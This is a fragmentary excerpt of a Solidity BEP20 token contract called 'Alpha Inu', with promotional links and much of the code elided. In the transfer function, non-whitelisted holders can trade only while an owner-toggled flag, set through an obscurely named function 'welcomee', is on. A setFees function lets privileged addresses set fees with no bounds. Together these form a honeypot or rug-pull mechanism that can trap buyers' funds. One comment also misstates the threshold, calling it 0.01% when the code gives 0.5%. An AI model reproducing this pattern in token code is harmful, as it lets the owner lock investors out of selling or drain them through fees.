...
Contract Deployment June 1 ,2022

//https://t.me/alphainuportal
//http://alphainu.site
...
abstract contract Auth {
    ...
    mapping (address => bool) internal Investor1;
...
contract AlphaInu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address LP = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string constant _name = "Alpha Inu";
    ...
    address public marketingFeeReceiver = 0xF41A0C2d5D155Eb200253f6D7b73E8E9293E8abF;
    ...
    uint256 public swapThreshold = _totalSupply * 50 / 10000; // 0.01% of supply
    bool inSwap;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!Investor1[sender] && !Investor1[recipient]){
            require(welcome,"welcomehome1");
        }

        // max wallet code
        if (!Investor1[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver){
    ...
    function welcomee(bool _status) public onlyOwner {
        welcome = _status;
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external  {
        require(isTxLimitExempt[msg.sender]);
